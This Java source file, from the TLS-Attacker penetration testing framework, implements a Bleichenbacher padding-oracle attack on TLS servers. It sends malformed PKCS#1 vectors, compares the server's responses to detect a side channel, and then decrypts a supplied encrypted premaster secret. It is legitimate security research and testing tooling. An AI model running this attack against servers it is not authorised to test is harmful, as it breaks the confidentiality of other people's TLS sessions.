/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsattacker.attacks.pkcs1.Bleichenbacher;
import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherVulnerabilityMap;
import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowGenerator;
import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowType;
import de.rub.nds.tlsattacker.attacks.pkcs1.Pkcs1Vector;
import de.rub.nds.tlsattacker.attacks.pkcs1.Pkcs1VectorGenerator;
import de.rub.nds.tlsattacker.attacks.pkcs1.VectorFingerprintPair;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.tlsattacker.attacks.util.response.EqualityError;
import de.rub.nds.tlsattacker.attacks.util.response.EqualityErrorTranslator;
import de.rub.nds.tlsattacker.attacks.util.response.FingerPrintChecker;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseExtractor;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseFingerprint;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
import de.rub.nds.tlsattacker.core.workflow.ParallelExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
import java.io.IOException;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Sends differently formatted PKCS#1 messages to the TLS server and observes
 * the server responses. In case there are differences in the server responses,
 * it is very likely that it is possible to execute Bleichenbacher attacks.
 */
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private BleichenbacherWorkflowType vulnerableType;

    private EqualityError errorType;

    private boolean shakyScans = false;

    private final ParallelExecutor executor;

    private List<VectorFingerprintPair> fingerprintPairList;

    /**
     *
     * @param bleichenbacherConfig
     * @param baseConfig
     */
    public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig) {
        super(bleichenbacherConfig, baseConfig);
        executor = new ParallelExecutor(1, 3);
    }

    /**
     *
     * @param bleichenbacherConfig
     * @param baseConfig
     * @param executor
     */
    public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig,
            ParallelExecutor executor) {
        super(bleichenbacherConfig, baseConfig);
        this.executor = executor;
    }

    /**
     *
     * @param type
     * @param encryptedPMS
     * @return
     */
    public State executeTlsFlow(BleichenbacherWorkflowType type, byte[] encryptedPMS) {
        Config tlsConfig = getTlsConfig();
        WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, type, encryptedPMS);
        State state = new State(tlsConfig, trace);
        tlsConfig.setWorkflowExecutorShouldClose(false);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
        return state;
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        errorType = getEqualityError();
        if (errorType != EqualityError.NONE) {
            vulnerableType = config.getWorkflowType();
            return true;
        }
        return false;
    }

    public EqualityError getEqualityError() {
        Config tlsConfig = getTlsConfig();
        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return null;
        }
        LOGGER.info("Fetched the following server public key: " + publicKey);
        List<Pkcs1Vector> pkcs1Vectors = Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType(),
                tlsConfig.getDefaultHighestClientProtocolVersion());
        // we execute the attack with different protocol flows and
        // return true as soon as we find the first inconsistency
        CONSOLE.info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
        CONSOLE.info("A server is considered secure if it always responds the same way.");
        LOGGER.debug("Testing: " + config.getWorkflowType());
        errorType = isVulnerable(pkcs1Vectors);
        return errorType;
    }

    public EqualityError isVulnerable(List<Pkcs1Vector> pkcs1Vectors) {
        fingerprintPairList = getBleichenbacherMap(config.getWorkflowType(), pkcs1Vectors);
        if (fingerprintPairList.isEmpty()) {
            LOGGER.warn("Could not extract Fingerprints");
            return null;
        }
        printBleichenbacherVectormap(fingerprintPairList);
        EqualityError error = getEqualityError(fingerprintPairList);
        if (error != EqualityError.NONE) {
            CONSOLE.info("Found a side channel. Rescanning to confirm.");
            // Socket Equality Errors can be caused by problems on on the
            // network. In this case we do a rescan
            // and check if we find the exact same answer behaviour (twice)
            List<VectorFingerprintPair> secondBleichenbacherVectorMap = getBleichenbacherMap(config.getWorkflowType(),
                    pkcs1Vectors);
            EqualityError error2 = getEqualityError(secondBleichenbacherVectorMap);
            BleichenbacherVulnerabilityMap mapOne = new BleichenbacherVulnerabilityMap(fingerprintPairList, error);
            BleichenbacherVulnerabilityMap mapTwo = new BleichenbacherVulnerabilityMap(secondBleichenbacherVectorMap,
                    error2);
            if (mapOne.looksIdentical(mapTwo)) {
                List<VectorFingerprintPair> thirdBleichenbacherVectorMap = getBleichenbacherMap(
                        config.getWorkflowType(), pkcs1Vectors);
                EqualityError error3 = getEqualityError(secondBleichenbacherVectorMap);
                BleichenbacherVulnerabilityMap mapThree = new BleichenbacherVulnerabilityMap(
                        thirdBleichenbacherVectorMap, error3);
                if (!mapTwo.looksIdentical(mapThree)) {
                    LOGGER.debug("The third scan prove this vulnerability to be non existent");
                    shakyScans = true;
                    error = EqualityError.NONE;
                }
            } else {
                LOGGER.debug("The second scan prove this vulnerability to be non existent");
                shakyScans = true;
                error = EqualityError.NONE;
            }
        }
        if (error != EqualityError.NONE) {
            CONSOLE.info("Found a vulnerability with " + config.getWorkflowType().getDescription());
        }
        return error;
    }

    /**
     *
     * @param bleichenbacherVectorMap
     * @return
     */
    public EqualityError getEqualityError(List<VectorFingerprintPair> bleichenbacherVectorMap) {
        ResponseFingerprint fingerprint = bleichenbacherVectorMap.get(0).getFingerprint();
        for (VectorFingerprintPair pair : bleichenbacherVectorMap) {
            EqualityError error = FingerPrintChecker.checkEquality(fingerprint, pair.getFingerprint(), false);
            if (error != EqualityError.NONE) {
                CONSOLE.info("Found an EqualityError!");
                CONSOLE.info(EqualityErrorTranslator.translation(error, fingerprint, pair.getFingerprint()));
                return error;
            }
        }
        return EqualityError.NONE;
    }

    private void printBleichenbacherVectormap(List<VectorFingerprintPair> bleichenbacherVectorMap) {
        LOGGER.debug("Vectormap:");
        LOGGER.debug("---------------");
        for (VectorFingerprintPair pair : bleichenbacherVectorMap) {
            LOGGER.debug(pair);
        }
        LOGGER.debug("---------------");
    }

    private List<VectorFingerprintPair> getBleichenbacherMap(BleichenbacherWorkflowType bbWorkflowType,
            List<Pkcs1Vector> pkcs1Vectors) {
        Config tlsConfig = getTlsConfig();
        tlsConfig.setWorkflowExecutorShouldClose(false);
        List<VectorFingerprintPair> bleichenbacherVectorMap = new LinkedList<>();
        List<State> stateList = new LinkedList<>();
        List<StateVectorPair> stateVectorPairList = new LinkedList<>();
        for (Pkcs1Vector pkcs1Vector : pkcs1Vectors) {
            WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, bbWorkflowType,
                    pkcs1Vector.getEncryptedValue());
            State state = new State(tlsConfig, trace);
            stateList.add(state);
            stateVectorPairList.add(new StateVectorPair(state, pkcs1Vector));
        }
        if (executor.getSize() > 1) {
            executor.bulkExecuteStateTasks(stateList);
            for (StateVectorPair stateVectorPair : stateVectorPairList) {
                processFinishedStateVectorPair(stateVectorPair, bleichenbacherVectorMap);
            }
        } else {
            for (StateVectorPair stateVectorPair : stateVectorPairList) {
                executor.bulkExecuteStateTasks(stateVectorPair.getState());
                processFinishedStateVectorPair(stateVectorPair, bleichenbacherVectorMap);
            }
        }

        return bleichenbacherVectorMap;
    }

    private void processFinishedStateVectorPair(StateVectorPair stateVectorPair,
            List<VectorFingerprintPair> bleichenbacherVectorMap) {
        if (stateVectorPair.getState().getWorkflowTrace().executedAsPlanned()) {
            ResponseFingerprint fingerprint = ResponseExtractor.getFingerprint(stateVectorPair.getState());
            bleichenbacherVectorMap.add(new VectorFingerprintPair(fingerprint, stateVectorPair.getVector()));
        } else {
            LOGGER.error("Could not execute Workflow. Something went wrong... Check the debug output for more information");
        }
        clearConnections(stateVectorPair.getState());

    }

    private ResponseFingerprint getFingerprint(BleichenbacherWorkflowType type, byte[] encryptedPMS) {
        State state = executeTlsFlow(type, encryptedPMS);
        if (state.getWorkflowTrace().allActionsExecuted()) {
            ResponseFingerprint fingerprint = ResponseExtractor.getFingerprint(state);
            clearConnections(state);
            return fingerprint;
        } else {
            clearConnections(state);
            LOGGER.warn("Could not execute Workflow. Something went wrong... Check the debug output for more information");
        }
        return null;
    }

    @Override
    public void executeAttack() {
        // needs to execute the isVulnerable method to configure the workflow
        // type
        boolean vulnerable = isVulnerable();
        LOGGER.info("Using the following oracle type: {}", vulnerableType);

        if (!vulnerable) {
            LOGGER.warn("The server is not vulnerable to the Bleichenbacher attack");
            return;
        }
        Config tlsConfig = getTlsConfig();
        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        if (config.getEncryptedPremasterSecret() == null) {
            throw new ConfigurationException("You have to set the encrypted premaster secret you are "
                    + "going to decrypt");
        }

        LOGGER.info("Fetched the following server public key: " + publicKey);
        byte[] pms = ArrayConverter.hexStringToByteArray(config.getEncryptedPremasterSecret());
        if ((pms.length * 8) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException("The length of the encrypted premaster secret you have "
                    + "is not equal to the server public key length. Have you selected the correct value?");
        }
        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, getTlsConfig(),
                extractValidFingerprint(publicKey, tlsConfig.getDefaultHighestClientProtocolVersion()), null,
                vulnerableType);
        Bleichenbacher attacker = new Bleichenbacher(pms, oracle, config.isMsgPkcsConform());
        attacker.attack();
        BigInteger solution = attacker.getSolution();
        CONSOLE.info(solution.toString(16));
    }

    private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey, ProtocolVersion version) {
        return getFingerprint(vulnerableType, Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, version)
                .getEncryptedValue());
    }

    /**
     *
     * @return
     */
    public BleichenbacherWorkflowType getVulnerableType() {
        return vulnerableType;
    }

    private void clearConnections(State state) {
        try {
            state.getTlsContext().getTransportHandler().closeConnection();
        } catch (IOException ex) {
            LOGGER.debug(ex);
        }
    }

    /**
     *
     * @return
     */
    public EqualityError getErrorType() {
        return errorType;
    }

    /**
     *
     * @return
     */
    public boolean isShakyScans() {
        return shakyScans;
    }

    public List<VectorFingerprintPair> getFingerprintPairList() {
        return fingerprintPairList;
    }
}
